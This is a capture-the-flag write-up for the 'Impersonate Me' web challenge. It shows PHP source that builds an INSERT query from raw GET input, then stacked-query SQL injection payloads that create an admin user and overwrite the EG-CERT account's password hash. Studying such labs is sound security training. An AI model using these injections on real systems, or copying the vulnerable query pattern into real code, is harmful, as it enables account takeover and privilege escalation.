---
title: IEEE Mansoura Victoris 2.0 - Impersonate Me
image:
    path: /assets/images/victoris2.jpg
date: 2023-09-20 20:00:00 +0800
categories: CTF
description: "Impersonate me web challenge writeup"
tags: [sqli, php]
---

Hey folks, This is my write-up for “Impersonate Me” web challenge, the challenge is easy, but only two managed to solve it.

- points: 500
- Total solves: 2

---

nothing on the website but `<a href="?src=">source</a>` to view the source.

```php
<?php 

include 'config.php';
if(isset($_GET['src'])){
    highlight_file(__FILE__);
    exit;
}

if(isset($_GET['username']) && isset($_GET['password']))
{
    if(isset($_GET['register']))
    {
        $username = $_GET['username'];
        $password = sha1($_GET['password']);
        $sql = "INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0,'$username','$password')";
        $stmt = $pdo->prepare($sql);
        $stmt->execute();
    }
    else{
        $username = $_GET['username'];
        $password = sha1($_GET['password']);
        $sql = "SELECT * FROM users where username = ? and password = ?";
        $stmt = $pdo->prepare($sql);
        $stmt->execute(array($username,$password));
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            if($row['is_admin'] && $row['username'] === 'EG-CERT')
                echo get_flag();
            else
                echo "You are not Authorized to get the Flag";
            exit;
        }
    }
}

?>
```

the code is very simple and straightforward like the previous “Hack Me” challenge.

we can register a new user or log in as an existing user

we can get the flag if the user is admin and the username is “EG-CERT”

the register code uses a prepared statement However, the problem lies in the way it constructs the SQL query string itself. it directly inserts the **`$username`** and **`$password`** variables into the SQL query string without binding them as placeholders. This is where the vulnerability exists because the values are not properly escaped or sanitized.

we can simply inject a stacked query in the username parameter, we can do that in the password parameter because it will be hashed using `sha1`

![Untitled](/assets/images/victorisv2-impersonate-me/Untitled.png)

- payload
    
    ```sql
    juba02', '516b9783fca517eecbd1d064da2d165310b19759'); INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (1, 'juba0x00
    ```
    
- final query:
    
    ```sql
    INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0,'juba02', '516b9783fca517eecbd1d064da2d165310b19759'); INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (1, 'juba0x00','f1296b8a9af8bf07e47b6ec6372659a8d299216a');
    ```
    

after sending this request I tried to log in as **juba0x00** it successfully logged in, this means we created an admin user, but we need to be **EG-CERT** to get the flag

Notice that the user juba02 is just a dummy user to make the first query's syntax is correct.

first I thought we could create a user called “**EG-CERT**” and **is_admin true**, I tried to log in, but the server did not respond with  “You are not Authorized to get the Flag” or the flag, this means the login query does not return result, I started wondering if the user was successfully created, or if the password was wrong

![wait-a-minute-wth.gif](/assets/images/victorisv2-impersonate-me/wait-a-minute-wth.gif)

wait a minute, the user already exists, we can just edit his password

![Untitled](/assets/images/victorisv2-impersonate-me/Untitled%201.png)

- payload
    
    ```sql
    juba113', 'juba0x00'); UPDATE `users` SET `password` = 'f1296b8a9af8bf07e47b6ec6372659a8d299216a' WHERE `username` = 'EG-CERT'; INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0,'juba11
    ```
    
- payload explanation
    
    ```sql
    juba113', 'juba0x00'); EDIT PASSWORD QUERY; ANOTHER QUERY
    ```
    
    I tried to comment the rest of the query after “EDIT PASSWORD QUERY” to not raise an error but it did not work, so I tried to append another dummy query to make the query syntax correct
    
    without the last stacked query the final query will contain `', 'any_pass_sha1');` be like the following:
    
    ```sql
    INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0, 'juba113', '516b9783fca517eecbd1d064da2d165310b19759'); UPDATE `users` SET `password` = 'f1296b8a9af8bf07e47b6ec6372659a8d299216a' WHERE `username` = 'EG-CERT';', 'any_pass_sha1');
    ```
    
- final query
    
    ```sql
    INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0, 'juba113', '516b9783fca517eecbd1d064da2d165310b19759'); UPDATE `users` SET `password` = 'f1296b8a9af8bf07e47b6ec6372659a8d299216a' WHERE `username` = 'EG-CERT'; INSERT INTO `users`(`is_admin`, `username`, `password`) VALUES (0,'juba11', 'any_pass_sha1');
    ```
    

![Untitled](/assets/images/victorisv2-impersonate-me/Untitled%202.png)

```
IEEE{i_th1nk_1t's_s0_e@sy_challenge_0a17c3be6254df9}
```

---
Thank you for reading. Have a great day!